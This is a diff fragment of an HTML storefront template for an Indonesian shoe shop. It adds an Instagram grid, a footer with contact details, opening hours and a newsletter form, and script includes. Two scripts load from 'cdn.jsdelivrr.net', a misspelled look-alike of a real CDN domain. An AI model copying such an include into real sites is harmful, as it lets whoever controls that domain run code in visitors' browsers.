+              <ion-icon name="logo-instagram"></ion-icon>
+            </a>
+          </li>
+
+          <li class="insta-post-item">
+            <img src="./images/insta-5.jpg" width="100" height="100" loading="lazy" alt="Instagram post"
+              class="insta-post-banner image-contain">
+
+            <a href="#" class="insta-post-link">
+              <ion-icon name="logo-instagram"></ion-icon>
+            </a>
+          </li>
+
+          <li class="insta-post-item">
+            <img src="./images/insta-6.jpg" width="100" height="100" loading="lazy" alt="Instagram post"
+              class="insta-post-banner image-contain">
+
+            <a href="#" class="insta-post-link">
+              <ion-icon name="logo-instagram"></ion-icon>
+            </a>
+          </li>
+
+          <li class="insta-post-item">
+            <img src="./images/insta-7.jpg" width="100" height="100" loading="lazy" alt="Instagram post"
+              class="insta-post-banner image-contain">
+
+            <a href="#" class="insta-post-link">
+              <ion-icon name="logo-instagram"></ion-icon>
+            </a>
+          </li>
+
+          <li class="insta-post-item">
+            <img src="./images/insta-8.jpg" width="100" height="100" loading="lazy" alt="Instagram post"
+              class="insta-post-banner image-contain">
+
+            <a href="#" class="insta-post-link">
+              <ion-icon name="logo-instagram"></ion-icon>
+            </a>
+          </li>
+
+        </ul>
+
+      </section>
+
+    </article>
+  </main>
+
+  <!-- 
+    - #FOOTER
+  -->
+
+  <footer class="footer" id="footerlink">
+
+    <div class="footer-top section">
+      <div class="container">
+
+        <div class="footer-brand">
+
+          <a href="#" class="logo">
+            <img src="./images/logo.png" width="160" height="50" alt="Footcap logo">
+          </a>
+
+          <ul class="social-list">
+
+            <li>
+              <a href="#" class="social-link">
+                <ion-icon name="logo-facebook"></ion-icon>
+              </a>
+            </li>
+
+            <li>
+              <a href="#" class="social-link">
+                <ion-icon name="logo-twitter"></ion-icon>
+              </a>
+            </li>
+
+            <li>
+              <a href="#" class="social-link">
+                <ion-icon name="logo-pinterest"></ion-icon>
+              </a>
+            </li>
+
+            <li>
+              <a href="#" class="social-link">
+                <ion-icon name="logo-linkedin"></ion-icon>
+              </a>
+            </li>
+
+          </ul>
+
+        </div>
+
+        <div class="footer-link-box">
+
+          <ul class="footer-list">
+
+            <li>
+              <p class="footer-list-title" style="color: blue">Contact Us</p>
+            </li>
+
+            <li>
+              <address class="footer-link">
+                <ion-icon name="location"></ion-icon>
+
+                <span class="footer-link-text">
+                Menara 165, Jln Tb. Simatupang
+                </span>
+              </address>
+            </li>
+
+            <li>
+              <a href="tel:+557343673257" class="footer-link">
+                <ion-icon name="call"></ion-icon>
+
+                <span class="footer-link-text">081255434750</span>
+              </a>
+            </li>
+
+            <li>
+              <a href="mailto:footcap@help.com" class="footer-link">
+                <ion-icon name="mail"></ion-icon>
+
+                <span class="footer-link-text">velosta@help.com</span>
+              </a>
+            </li>
+
+          </ul>
+
+          <ul class="footer-list">
+
+            <li>
+              <p class="footer-list-title" style="color: blue">Pengaturan</p>
+            </li>
+
+            <li>
+              <a href="#" class="footer-link">
+                <ion-icon name="chevron-forward-outline"></ion-icon>
+
+                <span class="footer-link-text">Akun Saya</span>
+              </a>
+            </li>
+
+            <li>
+              <a href="#" class="footer-link">
+                <ion-icon name="chevron-forward-outline"></ion-icon>
+
+                <span class="footer-link-text">Lihat Keranjang</span>
+              </a>
+            </li>
+
+            <li>
+              <a href="#" class="footer-link">
+                <ion-icon name="chevron-forward-outline"></ion-icon>
+
+                <span class="footer-link-text">Favorit</span>
+              </a>
+            </li>
+
+            <li>
+              <a href="#" class="footer-link">
+                <ion-icon name="chevron-forward-outline"></ion-icon>
+
+                <span class="footer-link-text">Perbandingan</span>
+              </a>
+            </li>
+
+            <li>
+              <a href="#" class="footer-link">
+                <ion-icon name="chevron-forward-outline"></ion-icon>
+
+                <span class="footer-link-text">Produk Baru</span>
+              </a>
+            </li>
+
+          </ul>
+
+          <div class="footer-list">
+
+            <p class="footer-list-title" style="color: blue">Jam Operasional</p>
+
+            <table class="footer-table" style="color: white">
+              <tbody>
+
+                <tr class="table-row" style="color: white">
+                  <th class="table-head" scope="row" style="color: white">Senin - Selasa:</th>
+
+                  <td class="table-data">8AM - 10PM</td>
+                </tr>
+
+                <tr class="table-row" style="color: white">
+                  <th class="table-head" scope="row" style="color: white">Rabu - Kamis:</th>
+
+                  <td class="table-data"  style="color: white">8AM - 7PM</td>
+                </tr>
+
+                <tr class="table-row">
+                  <th class="table-head" scope="row" style="color: white">Jum'at:</th>
+
+                  <td class="table-data">7AM - 12PM</td>
+                </tr>
+
+                <tr class="table-row">
+                  <th class="table-head" scope="row" style="color: white">Sabtu:</th>
+
+                  <td class="table-data">9AM - 8PM</td>
+                </tr>
+
+                <tr class="table-row">
+                  <th class="table-head" scope="row" style="color: white">Minggu:</th>
+
+                  <td class="table-data">Tutup</td>
+                </tr>
+
+              </tbody>
+            </table>
+
+          </div>
+
+          <div class="footer-list">
+
+            <p class="footer-list-title" style="color: blue">Kabar</p>
+
+            <p class="newsletter-text">
+              Menjadi website penjualan sepatu terbaik di Indonesia.
+            </p>
+
+            <form action="" class="newsletter-form">
+              <input type="email" name="email" required placeholder="Email Address" class="newsletter-input">
+
+              <button type="submit" class="btn btn-primary">Kirim</button>
+            </form>
+
+          </div>
+
+        </div>
+
+      </div>
+    </div>
+
+    <div class="footer-bottom">
+      <div class="container">
+
+        <p class="copyright">
+          &copy; 2024 <a href="#" class="copyright-link">codewithvelosta</a> Semua Hak Cipta Dilindungi
+        </p>
+
+      </div>
+    </div>
+
+  </footer>
+
+
+  <script src="script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+  <script src="https://cdn.jsdelivrr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivrr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>
+
+  <script>
+    AOS.init();
+  </script>
+</body>
+</html>
